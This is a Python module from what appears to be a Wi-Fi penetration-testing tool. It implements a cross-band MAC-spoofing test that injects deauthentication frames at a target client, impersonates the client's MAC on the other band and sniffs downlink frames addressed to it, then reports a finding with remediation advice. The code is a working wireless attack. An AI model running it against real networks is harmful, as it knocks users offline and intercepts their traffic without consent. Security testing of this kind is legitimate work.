"""Cross-band MAC spoof for downlink interception.

Tests whether an attacker can associate with victim's MAC on a different
band (2.4GHz vs 5GHz) and intercept downlink packets. Many APs don't
coordinate MAC tables across bands, allowing this cross-band impersonation.
"""

from __future__ import annotations

from scapy.all import Dot11, Dot11Deauth

from airsnitch.attacks.base import BaseAttackTest
from airsnitch.config import DEAUTH_COUNT
from airsnitch.core.packets import PacketEngine, PacketError
from airsnitch.core.types import Band, ClientInfo, Finding, NetworkContext, Severity
from airsnitch.safeguards.audit import AuditLogger


class DownlinkSpoofTest(BaseAttackTest):
    name = "downlink_spoof"
    description = "Cross-band MAC spoof for downlink interception"

    def __init__(self, ctx: NetworkContext, engine: PacketEngine, audit: AuditLogger):
        super().__init__(ctx, engine, audit)
        self._original_mac: str | None = None
        self._channel_changed = False
        self._original_channel: int | None = None
        self._monitor_was_active = False

    def preflight_check(self) -> tuple[bool, str]:
        if not self._ctx.gateway_mac:
            return False, "Gateway MAC not discovered"
        if not self._ctx.password:
            return False, "Wi-Fi password required for reassociation"
        if not self._engine.adapter:
            return False, "Wi-Fi adapter required for band/channel switching"
        return True, "Ready"

    def execute(self, target: ClientInfo) -> Finding:
        self._audit.log_test_start(
            self.name,
            target.mac,
            {"target_band": target.band.value if target.band else "unknown"},
        )

        # Determine target band and select alternate
        if target.band == Band.BAND_5:
            attack_band = Band.BAND_2_4
            attack_channel = 6
        else:
            attack_band = Band.BAND_5
            attack_channel = 36

        adapter = self._engine.adapter
        if adapter is None:
            raise PacketError("Wi-Fi adapter unavailable despite passing preflight")

        # Store original state for cleanup
        self._original_mac = adapter.get_mac()
        self._original_channel = adapter.get_channel()
        self._monitor_was_active = adapter.monitor_active

        # Enable monitor mode for 802.11 injection/sniffing
        if not adapter.monitor_active:
            adapter.enable_monitor()

        # Step 1: Controlled deauth of target (requires confirmation via safeguards)
        # Do NOT include RadioTap -- inject_80211 adds it
        deauth_frame = (
            Dot11(
                type=0,
                subtype=12,
                addr1=target.mac,
                addr2=self._ctx.gateway_mac,
                addr3=self._ctx.gateway_mac,
            )
            / Dot11Deauth(reason=7)
        )

        self._engine.inject_80211(deauth_frame, count=DEAUTH_COUNT)
        self._audit.log_packet_send(self.name, f"deauth {target.mac}", DEAUTH_COUNT)

        # Step 2: Switch to alternate band channel and spoof victim's MAC
        adapter.set_channel(attack_channel)
        self._channel_changed = True
        adapter.set_mac(target.mac)

        # Step 3: Sniff for downlink packets addressed to victim's MAC
        responses = self._engine.sniff_filtered(
            lfilter=lambda pkt: (
                pkt.haslayer(Dot11)
                and pkt[Dot11].addr1 == target.mac
                and pkt[Dot11].addr2 == self._ctx.gateway_mac
            ),
            timeout=10,
        )

        if responses:
            finding = Finding(
                test_name=self.name,
                severity=Severity.CRITICAL,
                confidence=0.8,
                description=(
                    f"Cross-band downlink interception possible. "
                    f"Attacker on {attack_band.value} (ch{attack_channel}) can receive "
                    f"packets destined for victim on {target.band.value if target.band else 'unknown'} band."
                ),
                evidence=f"Captured {len(responses)} downlink frames for {target.mac}",
                remediation=(
                    "Synchronize MAC tables across bands. "
                    "Implement band-aware client isolation. "
                    "Use per-client encryption keys (WPA3-Enterprise)."
                ),
            )
            self._audit.log_test_result(self.name, target.mac, {"success": True, "frames": len(responses)})
        else:
            finding = Finding(
                test_name=self.name,
                severity=Severity.LOW,
                confidence=0.4,
                description="Cross-band downlink interception not observed",
                evidence=f"No downlink frames captured for {target.mac} on alternate band",
                remediation="AP may synchronize MAC tables; verify manually",
            )
            self._audit.log_test_result(self.name, target.mac, {"success": False})

        return finding

    def cleanup(self) -> None:
        """Restore original MAC, channel, and monitor mode state."""
        adapter = self._engine.adapter
        if not adapter:
            return
        try:
            adapter.restore_mac()
        except Exception:
            pass
        if self._channel_changed and self._original_channel is not None:
            try:
                adapter.set_channel(self._original_channel)
            except Exception:
                pass
            self._channel_changed = False
        # Restore monitor mode to original state
        if not self._monitor_was_active and adapter.monitor_active:
            try:
                adapter.disable_monitor()
            except Exception:
                pass
